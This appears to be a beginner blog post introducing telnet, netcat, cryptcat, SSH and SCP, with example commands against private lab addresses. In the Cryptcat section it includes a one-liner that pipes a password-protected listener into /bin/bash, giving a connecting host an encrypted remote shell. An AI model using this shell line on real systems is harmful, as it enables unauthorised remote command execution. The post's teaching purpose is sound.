---
layout: post
published: true
title: Networking tools and utilities 2.1
tags:
  - PWP
  - Beginner
  - Networking tools and utilities
comments: true
---
## Usage of Telnet,Netcat,Socat,Cryptcat,SSH,SCP

## Introduction

I am going to explain these tools with examples, these tools provide interactive communication with another host.
Every tool has there different advantages, check their manual using man command for more.

## Telnet
Telnet is a network protocol works on port 23, it provides command-line interface to communicate with another host

Mostly it used in port testing, we can use telnet for banner grabbing, i will cover it later in this blog series.

To connect to host/server using telnet
~~~
# telnet -h

# telnet <hostname> <port>
~~~
example
~~~
# telnet 198.137.0.4 1234
~~~
## Netcat/nc

Its most useful utility for our use, It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports.
And its better than telnet for communication to another device.
~~~
# nc -h
~~~

Lets start a netcat listner in terminal 
~~~
# nc -lvvp 1337
nc -nlvvp 1337
Listening on 0.0.0.0 1337
~~~
Now its listening connection on host ip and 1337 port, lets connect it using another host or you can use another terminal tab just for satisfaction.
~~~
usage: nc <hostip> <port>
~~~
~~~
# nc 192.168.43.209 1337
~~~

try to chat with another host using terminal


## Cryptcat

The formula behind crypcat is: cryptcat = netcat + encryption.
Its basically a netcat variant which provide encryption over TCP/UDP communication with another host...


Let's play with it..............
~~~
# cryptcat -h
~~~
start cryptcat listner
~~~
# cryptcat -lv -p 1337
listening on [any] 1337 ...
~~~

Ok so its listning on 1337 lets connect using another terminal or host.
~~~
# cryptcat 192.168.43.209 1337
~~~
Now chat with another host

We can set -k perameter to make our communication password protected

Ok let's try encrypted reverse shell using cryptcat 
~~~

# cryptcat -k hacker -l -p 1337 0<myfifo | /bin/bash 1>myfifo

~~~

Now connect with it using another host

~~~
# cryptcat -k hacker 192.168.43.209 1337
~~~

You can excute commands on another host side and 

## SSH and SCP

SSH (Secure Shell) is a cryptographic network protocol for operating network services securely over an unsecured network. Typical applications include remote command-line, login, and remote command execution, but any network service can be secured with SSH.
We use it moslty to provide remote access to another host securley over unencrypted network

SCP(Secure Copy Protocol) copies files between hosts on a network, sshs for data transfer, and uses the same authentication and provides the same security as ssh.
 
_**To connect a ssh client with a host which is running sshd (ssh server) .**_

~~~
# ssh -h
ssh user@host (and enter password for connection)
~~~
example:
~~~
# ssh hacker@10.10.10.134
~~~
and enter password, or we can include ssh password also in same line

~~~
# sshpass -p "hahanoob" ssh hacker@10.10.10.134
~~~

We can also run GUI based commands from Remote SSH. How??

~~~

# ssh hacker@10.10.10.134 "DISPLAY=:0 no hup chrome"
~~~
or 
~~~
# ssh -X  hacker@10.10.10.134  firefox
~~~

To copy files over ssh we have to use scp
~~~
# scp -h
scp <filename> user@host:/filepath
~~~
example

~~~
# scp badguy.txt hacker@10.10.10.134:/home/mrw0r57
~~~

To download file 

~~~
# scp hacker@10.10.10.134:/home/mrw0r57/badguy.txt /home/myuser
~~~

## Conclusion

_**Learn these utilities by practical, we are going to use them in upcoming blog posts**_
